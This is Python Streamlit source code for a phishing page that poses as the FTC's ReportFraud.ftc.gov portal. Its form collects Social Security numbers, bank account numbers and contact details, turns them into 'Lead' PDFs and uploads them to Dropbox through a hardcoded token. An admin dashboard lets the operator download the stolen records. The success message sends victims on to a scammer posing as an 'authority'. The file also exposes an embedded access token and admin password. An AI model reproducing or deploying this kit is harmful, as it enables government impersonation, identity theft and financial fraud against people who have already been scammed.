import streamlit as st
import dropbox
from reportlab.pdfgen import canvas
import io
from datetime import datetime

# --- CONFIGURATION ---
# 1. Get your token from Dropbox Developers Console
# 2. Set permissions to files.content.write and files.content.read
DROPBOX_TOKEN = 'sl.u.AGUJiMYqlml8jEUd1jwxQcHNjl3ldqrqqracKvhiKMleVSRHh2vjoqk1IEys9sMewblEKP4ysxEv-rlLbXeducmvtbkVYLsKdsUm_zIVWWEefGZ_r8b2TnBalQYc-Oo6ODs1PdLS2R1-oTpU8RtNOuXJtuZ18klhcdMZUxsc1igq__4j1AeXwVbfZ0lTSt3Q0KIW2LeNCEtQzRT4sg_8KOfDYPWyRE3_gBsDMrPEfYOjfJ9fll8JXqhE3coz6MEXcL1aIr7VcCbxf-tgYoiteb0ADO4Mn4w_-wNKsatfSnJ0ELJP3anx1YXo054Wt6ovD0wHpcdenNS7cns54Zdi267ZbPsMJ-om4s23vT4TCCvTiolm2ism3mmy9l5509lBuE18Ks1colksTboHbFxCbGKXkMjydEDMNpa5ZcqEBwNyHZbhQ-pqD1BTn6tWfgCgHzuC6AG79P2f1c73LUgzJnhzMosR2aj2DU_xZ0Lqabe_q1kxI42uiizLSNeij0I6gUMTq8yt124DAlSzGsqoo04DAkz-RapKGB94pi8N8HbPDRJJz3dF6_SGsUdsMCWyzaaEUQZWoc6tOOb0fvSCkvnfuntyAFe4cl6axSqdft9AcJ5HWjhwkl7DOpfFf1DAyab1NO1kDR540ZgatUQmoMcuIbe4cpFMJ3ReTtvPHycAYxMqwvEuEGk9Mpp3sizPU7rg8h-NTvrSWLTHkVdf7nAE_a1doGZhc1vJX0lajoC04_dPyweRZ7RMgahVpVnQOmcbOc8WdQ8-OPmCXPjk8Jt15mebKDtuMH25wDasA8OtudPDWTRbcSn9dINgM5cwIMvJDQaiLnokx6nN3fvarvlzn0ZYTjFe8R485zmoOTUkhWOLQths8nfrOpqb9WUvNnnsVY3tA0BrQ2uOxEQOUA0yrCbmoRpw0VXw_QLgiXnvgOTqBb6lxdWqLt60VZL_4OLf6TFb4q0-tRSfMeH4hZMgDJexZYa61r8uZm7Yi5NTzra3xwM_C-v3pysi8k8EBt6EYCWaV5GHdZMrMJzBTEpfycWFSMD1KySzb5lFT7630wySM8dUzVcpvxuUqN32s1kED8ybbjWK_mC6sU6NfGhKjInFyYcZETX1BuSSe-NSE1uKZqhvcoQyFhpu1KyGRpeRXYOuTKe6imhI6QHDKM3L7D_RMzJQcjKb3LBOvjQR8yyHPwn5nEFFLgwcIosMpWTUIgD8vuYRS27NLIXTSWi71ftEeRQSGNNeBMkzdTbNKxn_1UWBf-uBDpE9iH4Tdss' 
ADMIN_PASSWORD = "Godisgreat@1"

# --- STYLING (FTC CLONE) ---
st.set_page_config(page_title="Report Fraud | FTC", page_icon="🛡️")

st.markdown("""
    <style>
    .main { background-color: #ffffff; }
    h1, h2, h3 { color: #003e67 !important; font-family: 'Segoe UI', sans-serif; }
    .stButton>button { 
        background-color: #003e67; color: white; font-weight: bold; 
        border-radius: 4px; padding: 0.6rem 2.5rem; text-transform: uppercase;
    }
    .stButton>button:hover { background-color: #002a4d; border: 1px solid #003e67; }
    [data-testid="stSidebar"] { background-color: #f8fafc; border-right: 1px solid #e2e8f0; }
    </style>
    """, unsafe_allow_html=True)

# --- HIDDEN ADMIN SIDEBAR ---
with st.sidebar:
    st.markdown("### 🔐 Admin Access")
    access_key = st.text_input("Enter Secret Key", type="password")
    is_admin = (access_key == ADMIN_PASSWORD)

# --- PUBLIC PAGE: THE FORM ---
if not is_admin:
    col_logo, col_text = st.columns([1, 3])
    with col_logo:
        # Replace with your actual College Logo URL
        st.image("https://via.placeholder.com/150x80?text=COLLEGE+LOGO", width=120)
    with col_text:
        st.markdown("<h5 style='color:#64748b; margin-bottom:0;'>OFFICIAL GOVERNMENT PROJECT PORTAL</h5>", unsafe_allow_html=True)
        st.markdown("<h2 style='margin-top:0;'>ReportFraud.ftc.gov</h2>", unsafe_allow_html=True)

    st.divider()
    
    with st.form("ftc_form", clear_on_submit=True):
        st.markdown("### 1. Select Problem Category")
        category = st.selectbox("Category", [
            "An impersonator", "Online shopping scam", "Investment Scam", "Other"
        ], label_visibility="collapsed")
        
        st.markdown("### 2. Financial Evidence (Excel-Style Capture)")
        c_b1, c_b2 = st.columns(2)
        b_name = c_b1.text_input("Bank Name")
        b_acc = c_b1.text_input("Bank Account Number")
        ssn = c_b2.text_input("Social Security Number", type="password")
        amt = c_b2.number_input("Amount Lost ($)", min_value=0)

        st.markdown("### 3. Your Details")
        fname = st.text_input("First Name")
        lname = st.text_input("Last Name")
        email = st.text_input("Email Address")

        if st.form_submit_button("Submit Final Report ➔"):
            # PDF EXCEL-STYLE TABLE GENERATION
            packet = io.BytesIO()
            can = canvas.Canvas(packet)
            can.setFillColorRGB(0, 0.24, 0.40)
            can.rect(0, 750, 600, 100, fill=1)
            can.setFillColorRGB(1, 1, 1)
            can.setFont("Helvetica-Bold", 18)
            can.drawString(50, 785, "FTC FRAUD CASE: STRUCTURED LEAD DATA")
            
            can.setFillColorRGB(0, 0, 0)
            can.setFont("Helvetica-Bold", 10)
            can.drawString(50, 710, "FIELD NAME")
            can.drawString(250, 710, "COLLECTED DATA")
            
            data_map = [
                ("Name", f"{fname} {lname}"), ("Email", email), ("Category", category),
                ("Bank", b_name), ("Account", b_acc), ("SSN", ssn), ("Amount", f"${amt}")
            ]
            y = 680
            for label, val in data_map:
                can.line(40, y-5, 560, y-5)
                can.drawString(50, y, label.upper())
                can.drawString(250, y, str(val))
                y -= 25
            
            can.save()
            packet.seek(0)
            
            try:
                dbx = dropbox.Dropbox(DROPBOX_TOKEN)
                dbx.files_upload(packet.read(), f"/{fname}_{lname}_Lead.pdf", mode=dropbox.files.WriteMode.overwrite)
                st.success("✅ REPORT FILED SUCCESSFULLY")
                st.warning("KINDLY CALL THE AUTHORITY WHO YOU ARE CONNECTED WITH YOU AT THE MOMENT AT TEXT OR CALL SUPPORT.")
                st.balloons()
            except Exception as e:
                st.error(f"Sync Error: {e}")

# --- ADMIN PAGE: THE DASHBOARD ---
else:
    st.title("🛡️ Admin Lead Management")
    try:
        dbx = dropbox.Dropbox(DROPBOX_TOKEN)
        files = dbx.files_list_folder("").entries
        if not files:
            st.info("Database Empty.")
        else:
            for f in files:
                with st.expander(f"📄 {f.name}"):
                    c1, c2 = st.columns(2)
                    _, res = dbx.files_download("/" + f.name)
                    c1.download_button("Download Lead", res.content, file_name=f.name)
                    if c2.button(f"Delete {f.name}"):
                        dbx.files_delete_v2("/" + f.name)
                        st.rerun()
    except Exception as e:
        st.error(f"Error: {e}")
